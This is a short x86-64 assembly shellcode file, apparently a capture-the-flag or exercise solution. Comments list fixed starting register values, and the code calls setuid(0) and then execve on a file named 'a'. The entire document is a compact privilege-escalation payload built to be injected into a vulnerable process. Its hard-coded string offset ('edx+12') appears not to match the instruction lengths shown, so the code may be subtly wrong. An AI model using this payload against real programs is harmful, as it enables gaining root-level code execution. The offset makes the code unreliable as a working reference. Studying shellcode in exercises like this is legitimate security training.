.global _start
_start:
.intel_syntax noprefix

# STARTING FIXED REGISTERS:
    # rdx =   starting rip
    # rax =   0   = 0x0
    # r8  =   22  = 0x16
    # r9  =   3   = 0x3 
    # r11 =   582 = 0x246

#SETUID
    mov al, 105
    xor edi, edi
    syscall
    
#CALL evecve (syscall 59)
    #rax = 59
    #rdi = [a]
    #rsi = 0
    #rdx = 0

    mov al, 59
    lea edi, [edx+12]    # 4bytes
    xor esi, esi    
    xor edx, edx
    syscall

file:
    .string "a"
